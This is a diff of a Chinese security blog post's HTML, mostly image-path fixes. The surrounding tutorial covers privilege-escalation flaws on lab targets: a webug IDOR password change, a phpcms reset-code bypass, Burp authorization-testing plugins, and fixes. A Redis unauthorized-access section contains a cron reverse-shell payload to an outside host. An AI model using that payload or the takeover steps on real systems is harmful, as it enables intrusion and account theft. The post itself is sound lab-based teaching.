@@ -196,33 +196,33 @@ post: &#123;&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&
 <p>漏洞演示：演示为靶场的22号漏洞，越权修改密码</p>
 <p>靶场安装：<a target="_blank" rel="noopener" href="https://github.com/wangai3176/webug4.0%EF%BC%8C%E6%9C%AC%E6%9D%A5%E4%B9%9F%E7%BB%99%E4%BA%86%E4%B8%80%E4%B8%AAvm%E7%9A%84%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83%EF%BC%8C%E4%BD%86%E6%98%AF%E9%82%A3%E4%B8%AA%E7%99%BE%E5%BA%A6%E4%BA%91%E6%89%93%E4%B8%8D%E5%BC%80%E4%BA%86%E3%80%82%E5%B0%B1%E7%9B%B4%E6%8E%A5%E7%94%A8%E6%96%87%E4%BB%B6%E8%87%AA%E5%B7%B1%E5%AE%89%E8%A3%85%EF%BC%8C%E4%B9%9F%E6%B2%A1%E6%89%BE%E5%88%B0%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%8C%E5%B0%B1%E6%91%B8%E7%B4%A2%E7%9D%80%E5%A6%82%E4%B8%8B%E5%AE%89%E8%A3%85%E4%BA%86%E3%80%82">https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。</a></p>
 <p>把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762175585.png" alt="1560762175585"></p>
-<p>另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径：</p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762175585.png" alt="1560762175585"></p>
+<p>另外需要修改&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径：</p>
 <pre class="line-numbers language-none"><code class="language-none">header(&quot;Location:&#x2F;pt_env&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd2.php?id&#x3D;&#123;$id&#125;&quot;)
 修改为：
 header(&quot;Location:&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd2.php?id&#x3D;&#123;$id&#125;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>点击第一个越权修改密码后进入如下页面：</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762425340.png" alt="1560762425340"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762425340.png" alt="1560762425340"></p>
 <p>此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下：</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762734951.png" alt="1560762734951"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762734951.png" alt="1560762734951"></p>
 <p>此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762941147.png" alt="1560762941147"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762941147.png" alt="1560762941147"></p>
 <p>此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763134387.png" alt="1560763134387"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763134387.png" alt="1560763134387"></p>
 <p>其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763314987.png" alt="1560763314987"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763314987.png" alt="1560763314987"></p>
 <p>查看数据库修改是否成功：</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763331000.png" alt="1560763331000"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763331000.png" alt="1560763331000"></p>
 <p>此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。</p>
 <h2 id="0x06、测试工具"><a href="#0x06、测试工具" class="headerlink" title="0x06、测试工具"></a>0x06、测试工具</h2><p>对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。</p>
 <p>此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。</p>
 <p>在burp的Extender选项中选择BApp Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下：</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763815165.png" alt="1560763815165"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763815165.png" alt="1560763815165"></p>
 <p>此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763954202.png" alt="1560763954202"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763954202.png" alt="1560763954202"></p>
 <p>获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560764399936.png" alt="1560764399936"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560764399936.png" alt="1560764399936"></p>
 <p>其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。</p>
 <p>能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。</p>
 <p>介绍地址：<a target="_blank" rel="noopener" href="https://github.com/portswigger/auth-matrix">https://github.com/portswigger/auth-matrix</a></p>
@@ -230,21 +230,21 @@ header(&quot;Location:&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd2.php?
 <p>漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码</p>
 <p>漏洞下载：<a target="_blank" rel="noopener" href="http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip">http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip</a></p>
 <p>解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：<a target="_blank" rel="noopener" href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256</a></p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560820634816.png" alt="1560820634816"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560820634816.png" alt="1560820634816"></p>
 <p>在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560820798272.png" alt="1560820798272"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560820798272.png" alt="1560820798272"></p>
 <p>在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码-&gt;用户名找回密码</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560824925363.png" alt="1560824925363"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560824925363.png" alt="1560824925363"></p>
 <p>点击获取邮箱效验码</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560824994228.png" alt="1560824994228"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560824994228.png" alt="1560824994228"></p>
 <p>返回上一步输入想修改的用户，如下test2</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825360733.png" alt="1560825360733"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825360733.png" alt="1560825360733"></p>
 <p>输入之前的邮箱验证码提交</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825402669.png" alt="1560825402669"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825402669.png" alt="1560825402669"></p>
 <p>点击后显示密码修改成功为以下：</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825420971.png" alt="1560825420971"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825420971.png" alt="1560825420971"></p>
 <p>尝试使用新密码登陆成功：</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825511643.png" alt="1560825511643"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825511643.png" alt="1560825511643"></p>
 <p>漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。</p>
 <h3 id="0x07-2、redis未授权访问"><a href="#0x07-2、redis未授权访问" class="headerlink" title="0x07-2、redis未授权访问"></a>0x07-2、redis未授权访问</h3><p>漏洞环境：Ubuntu，reids 3.2.0</p>
 <p>漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell</p>
@@ -263,9 +263,9 @@ protected-mode yes  改为no<span aria-hidden="true" class="line-numbers-rows"><
 <pre class="line-numbers language-none"><code class="language-none">.&#x2F;src&#x2F;redis-server redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>启动后显示如下：</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560837844041.png" alt="1560837844041"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560837844041.png" alt="1560837844041"></p>
 <p>通过reids命令可以查看基本信息</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560837899368.png" alt="1560837899368"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560837899368.png" alt="1560837899368"></p>
 <p>尝试反弹shell到指定地址</p>
 <pre class="line-numbers language-none"><code class="language-none">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.30.79&#x2F;2333 0&gt;&amp;1\n&quot;
 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;
@@ -273,7 +273,7 @@ config set dbfilename root
 save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>或者采用gopher协议，直接利用curl一条命令执行</p>
-<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560840948082.png" alt="1560840948082"></p>
+<p><img src="/2019/06/%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560840948082.png" alt="1560840948082"></p>
 <h2 id="0x08、漏洞修复"><a href="#0x08、漏洞修复" class="headerlink" title="0x08、漏洞修复"></a>0x08、漏洞修复</h2><p>1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。</p>
 <p>2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php</p>
 <p>3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。</p>
